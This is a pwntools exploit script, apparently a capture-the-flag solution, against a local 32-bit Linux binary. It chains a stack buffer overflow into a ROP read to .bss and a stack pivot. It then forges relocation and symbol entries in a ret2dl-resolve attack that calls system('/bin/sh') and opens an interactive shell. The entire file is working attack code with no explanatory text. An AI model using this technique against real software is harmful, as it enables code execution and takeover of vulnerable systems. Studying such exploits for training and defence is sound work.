#coding:utf-8

from pwn import *

context(os='linux',arch='i386')
#context.log_level = 'debug'

p = process('./pwn')
P = ELF('./pwn')

lr = 0x08048448
bss = 0x0804aa00
pppr_addr = 0x080485d9
pop_ebp = 0x080485db

payload = (0x28+4) * 'a'
payload+= p32(P.plt['read'])
payload+= p32(pppr_addr)
payload+= p32(0)
payload+= p32(bss) 
payload+= p32(0x400)
payload+= p32(pop_ebp)
payload+= p32(bss)
payload+= p32(lr)
p.send(payload)

sleep(1)

plt_0 = 0x08048380
r_info = 0x107
rel_plt = 0x0804833c  
dynsym =  0x080481dc
dynstr = 0x0804827c

fake_sys_addr = bss + 36
align = 0x10 - ((fake_sys_addr-dynsym)&0xf)
fake_sys_addr = fake_sys_addr + align
index = (fake_sys_addr - dynsym)/0x10
r_info = (index << 8) + 0x7
st_name = (fake_sys_addr + 0x10) - dynstr
fake_sys = p32(st_name) + p32(0) + p32(0) + p32(0x12) 

fake_rel = p32(P.got['read']) + p32(r_info)
fake_rel_addr = bss + 28
fake_index = fake_rel_addr - rel_plt    

payload = p32(bss)
payload+= p32(plt_0)
payload+= p32(fake_index)
payload+= p32(0xdeadbeef)
payload+= p32(bss+0x80)
payload+= p32(0)
payload+= p32(0)
payload+= fake_rel
payload+= 'a'*align
payload+= fake_sys
payload+= 'system'
payload = payload.ljust(0x80,'\x00')
payload+= '/bin/sh\x00'
p.sendline(payload)

p.interactive()
